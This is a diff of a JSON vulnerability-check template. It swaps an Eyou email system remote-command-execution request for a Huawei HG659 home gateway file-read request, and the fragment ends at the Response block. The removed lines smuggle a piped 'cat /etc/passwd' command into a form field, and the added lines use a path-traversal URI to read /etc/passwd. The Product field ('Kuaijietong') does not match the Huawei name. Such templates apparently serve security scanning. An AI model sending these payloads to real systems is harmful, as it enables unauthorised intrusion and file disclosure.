@@ -1,17 +1,15 @@
 {
-    "Name": "亿邮电子邮件系统RCE漏洞",
-    "Description": "亿邮电子邮件系统RCE漏洞",
-    "Product": "亿邮",
+    "Name": "Huawei Home Gateway hg659 File Read",
+    "Description": "Huawei Home Gateway hg659 File Read",
+    "Product": "Kuaijietong",
     "author": "chumeng",
     "Request":[
-                {
-        "Method": "POST",
-        "Header": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
-            "Content-Type":"application/x-www-form-urlencoded"},
-        "Uri":"/webadm/?q=moni_detail.do&action=gragh",
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/lib///....//....//....//....//....//....//....//....//etc//passwd",
         "Port":"",
-        "Data":"type='|cat /etc/passwd ||'",
+        "Data":"",
         "Follow_redirects":"false",
         "Upload":{"Name": "","fileName": "","filePath": "" },
         "Response":{
